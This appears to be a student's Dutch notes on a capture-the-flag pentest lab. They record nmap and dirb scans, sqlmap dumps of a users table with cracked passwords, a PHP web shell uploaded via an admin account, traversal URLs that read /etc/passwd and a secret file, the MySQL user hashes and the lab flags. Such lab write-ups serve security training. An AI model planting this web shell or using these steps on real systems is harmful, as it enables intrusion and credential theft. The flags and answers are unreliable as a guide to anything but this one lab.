# Ethical Hacking Foundation Notes

## Pentesting preperation

## Tools:
Shodan (search engine voor systemen)
> [syntax cheatsheet](https://book.martiandefense.org/notes/security-research/shodan-dork-cheatsheet)

PimEyes
> AI Reverse image search obv gezichtsherkenning

nmap
> network scan [cheatsheet](https://highon.coffee/blog/nmap-cheat-sheet/)

Dirb
> Directory scan voor domeinen

Nikto
> Vulnerability scan tool voor domeinen

Crackstation
> Rainbow table

## Pentest room Bicsma
### IP/poorten
http://10.10.96.117/

nmap:
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
58751/tcp open  unknown

### DIRB poort 80
---- Scanning URL: http://10.10.96.117/ ----
==> DIRECTORY: http://10.10.96.117/employees/
+ http://10.10.96.117/index.html (CODE:200|SIZE:10701)
==> DIRECTORY: http://10.10.96.117/javascript/
+ http://10.10.96.117/phpmyadmin (CODE:401|SIZE:460)
+ http://10.10.96.117/robots.txt (CODE:200|SIZE:61)
+ http://10.10.96.117/server-status (CODE:403|SIZE:301)

---- Entering directory: http://10.10.96.117/employees/ ----
+ http://10.10.96.117/employees/index.php (CODE:200|SIZE:1744)
==> DIRECTORY: http://10.10.96.117/employees/uploads/

---- Entering directory: http://10.10.96.117/javascript/ ----
==> DIRECTORY: http://10.10.96.117/javascript/jquery/

---- Entering directory: http://10.10.96.117/employees/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.96.117/javascript/jquery/ ----
+ http://10.10.96.117/javascript/jquery/jquery (CODE:200|SIZE:252879)
+ http://10.10.96.117/javascript/jquery/version (CODE:200|SIZE:5)

-----------------
END_TIME: Thu Nov 13 12:42:52 2025
DOWNLOADED: 18448 - FOUND: 7

### Hydra op poort 22 (ssh)
username root

unsuccesful

### sql map op /employeemail veld
1. burpsuite request gekopieerd en in sqlmap gebruikt als template
Database: information_schema
[40 tables]
+----------------------------------------------+
| CHARACTER_SETS                               |
| COLLATIONS                                   |
| COLLATION_CHARACTER_SET_APPLICABILITY        |
| COLUMN_PRIVILEGES                            |
| ENGINES                                      |
| EVENTS                                       |
| FILES                                        |
| GLOBAL_STATUS                                |
| GLOBAL_VARIABLES                             |
| INNODB_BUFFER_PAGE                           |
| INNODB_BUFFER_PAGE_LRU                       |
| INNODB_BUFFER_POOL_STATS                     |
| INNODB_CMP                                   |
| INNODB_CMPMEM                                |
| INNODB_CMPMEM_RESET                          |
| INNODB_CMP_RESET                             |
| INNODB_LOCKS                                 |
| INNODB_LOCK_WAITS                            |
| INNODB_TRX                                   |
| KEY_COLUMN_USAGE                             |
| PARAMETERS                                   |
| PARTITIONS                                   |
| PLUGINS                                      |
| PROCESSLIST                                  |
| PROFILING                                    |
| REFERENTIAL_CONSTRAINTS                      |
| ROUTINES                                     |
| SCHEMATA                                     |
| SCHEMA_PRIVILEGES                            |
| SESSION_STATUS                               |
| SESSION_VARIABLES                            |
| TABLESPACES                                  |
| TABLE_CONSTRAINTS                            |
| TABLE_PRIVILEGES                             |
| TRIGGERS                                     |
| USER_PRIVILEGES                              |
| VIEWS                                        |
| COLUMNS                                      |
| STATISTICS                                   |
| TABLES                                       |
+----------------------------------------------+

Database: mysql
[24 tables]
+----------------------------------------------+
| db                                           |
| event                                        |
| user                                         |
| columns_priv                                 |
| func                                         |
| general_log                                  |
| help_category                                |
| help_keyword                                 |
| help_relation                                |
| help_topic                                   |
| host                                         |
| ndb_binlog_index                             |
| plugin                                       |
| proc                                         |
| procs_priv                                   |
| proxies_priv                                 |
| servers                                      |
| slow_log                                     |
| tables_priv                                  |
| time_zone                                    |
| time_zone_leap_second                        |
| time_zone_name                               |
| time_zone_transition                         |
| time_zone_transition_type                    |
+----------------------------------------------+

Database: performance_schema
[17 tables]
+----------------------------------------------+
| cond_instances                               |
| events_waits_current                         |
| events_waits_history                         |
| events_waits_history_long                    |
| events_waits_summary_by_instance             |
| events_waits_summary_by_thread_by_event_name |
| events_waits_summary_global_by_event_name    |
| file_instances                               |
| file_summary_by_event_name                   |
| file_summary_by_instance                     |
| mutex_instances                              |
| performance_timers                           |
| rwlock_instances                             |
| setup_consumers                              |
| setup_instruments                            |
| setup_timers                                 |
| threads                                      |
+----------------------------------------------+

Database: phpmyadmin
[17 tables]
+----------------------------------------------+
| pma__bookmark                                |
| pma__column_info                             |
| pma__designer_coords                         |
| pma__favorite                                |
| pma__history                                 |
| pma__navigationhiding                        |
| pma__pdf_pages                               |
| pma__recent                                  |
| pma__relation                                |
| pma__savedsearches                           |
| pma__table_coords                            |
| pma__table_info                              |
| pma__table_uiprefs                           |
| pma__tracking                                |
| pma__userconfig                              |
| pma__usergroups                              |
| pma__users                                   |
+----------------------------------------------+

Database: web
[3 tables]
+----------------------------------------------+
| content                                      |
| flag                                         |
| users                                        |
+----------------------------------------------+

#### Flag in flag tabel:
+----------------------------------------------+
| id                                           |
+----------------------------------------------+
| EHF-ff135df65f5b5e3f05f62071ffda85fd8d489f53 |
+----------------------------------------------+

#### Users:
[6 entries]
+------+---------------------------+-----------------+--------------+--------------------------------------+
| id   | email                     | name            | username     | password                             |
+------+---------------------------+-----------------+--------------+--------------------------------------+
| 1    | admin@bicsma.com          | Administrator   | admin        | ctf=b0d31883eeb448419e26f565ce90a9e3 | bicsmactfsupersecretadminpassword
| 2    | carl.smith@bicsma.com     | Carl Smith      | carlsmith    | ctf=8621ffdbc5698829397d97767ac13db3 | dragon
| 3    | nicole.lawford@bicsma.com | Nicole Lawford  | nlawford     | ctf=4cb9c8a8048fd02294477fcb1a41191a | changeme
| 4    | brad.ruth@bicsma.com      | Brad Ruth       | bradruth     | ctf=6eea9b7ef19179a06954edd0f6c05ceb | qwertyuiop
| 5    | alice.jenkins@bicsma.com  | Alice Jenkins   | alicejenkins | ctf=8afa847f50a716e64932d995c8e7435a | princess
| 6    | temp.admin@bicsma.com     | Temporary Admin | tempadmin    | ctf=eb0a191797624dd3a48fa681d3061212 | master
+------+---------------------------+-----------------+--------------+--------------------------------------+

### Recept
Shell geuploadt in het upload veld door in te loggen als admin@bicsma.com(admin)

shell:
```php
<?php
if (isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
```
Daarna directory traversal:

http://10.10.96.117/employees/uploads/cmd.phtml?cmd=cat%20ls%20../../../../../recipe/bicsma-cola-recipe.txt

####################CONFIDENTIAL############### Note that this recipe for Bicsma Cola is strictly confidential and should not be taken off this server in any way! +++++++++++++++++++++++++++++++++++++++++++++++ Basically it is an exact copy of the Reed recipe on wikipedia: http://en.wikipedia.org/wiki/Coca-Cola-formula The only thing we add is 1 gram of cinamon Flag: EHF-b46ae987ccfc3faabf687df45ef89bd75f2a8992

### users:
#### Op machine
http://10.10.96.117/employees/uploads/cmd.phtml?cmd=cat%20../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin bicsma:x:1000:1000:,,,:/home/bicsma:/bin/bash mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false

#### Op phpmyadmin
Host,User,plugin,ssl_type,Drop_priv,File_priv,Alter_priv,Event_priv,Grant_priv,Index_priv,Super_priv,Password,ssl_cipher,Create_priv,Delete_priv,Insert_priv,Reload_priv,Select_priv,Update_priv,max_updates,x509_issuer,Execute_priv,Process_priv,Show_db_priv,Trigger_priv,x509_subject,Shutdown_priv,max_questions,Show_view_priv,References_priv,Repl_slave_priv,max_connections,Create_user_priv,Create_view_priv,Lock_tables_priv,Repl_client_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv,authentication_string,Create_tablespace_priv
127.0.0.1,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*925908C492E9446ED359E63C700C1A78109A8CB7,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
::1,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*925908C492E9446ED359E63C700C1A78109A8CB7,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
bicsmasrv,root,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*925908C492E9446ED359E63C700C1A78109A8CB7,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
localhost,debian-sys-maint,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*99FBE9F5A36700B7849CD1068391740E9036145A,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,<blank>,Y
localhost,phpmyadmin,<blank>,<blank>,Y,Y,Y,Y,Y,Y,Y,*81BAC94BAAA0866BE75AAC7E44B0FEFCF2E08063,<blank>,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y,Y,Y,<blank>,Y,0,Y,Y,Y,0,Y,Y,Y,Y,Y,Y,0,Y,NULL,Y
localhost,root,<blank>,<blank>,N,N,N,N,N,N,N,*925908C492E9446ED359E63C700C1A78109A8CB7,<blank>,N,N,N,N,N,N,0,<blank>,N,N,N,N,<blank>,N,0,N,N,N,0,N,N,N,N,N,N,0,N,NULL,N

